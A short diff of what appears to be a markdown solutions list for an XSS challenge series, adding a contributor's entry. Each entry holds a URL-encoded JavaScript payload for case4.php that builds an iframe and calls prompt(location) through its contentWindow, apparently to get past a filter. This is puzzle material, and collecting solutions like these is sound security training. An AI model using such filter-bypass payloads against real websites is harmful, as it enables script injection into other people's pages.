@@ -87,5 +87,8 @@
 
 	#### @Nearg1e [yourneargo@gmail.com]
 	- case4.php?x=document.writeln(%22%3Ciframe%3E%3C/iframe%3E%22);let%20f=document.querySelector(%27iframe%27);f.contentWindow.prompt(location);
+	
+	#### wenxu wu [ma7h1as.l@gmail.com]
+	- case4.php?x=document.body.innerHTML=%27%3Ciframe%20id=%22a%22%20/%3E%27;a.contentWindow.prompt(location)
 
 [http://server.n0tr00t.com/n0js/case5.php](http://server.n0tr00t.com/n0js/case5.php)
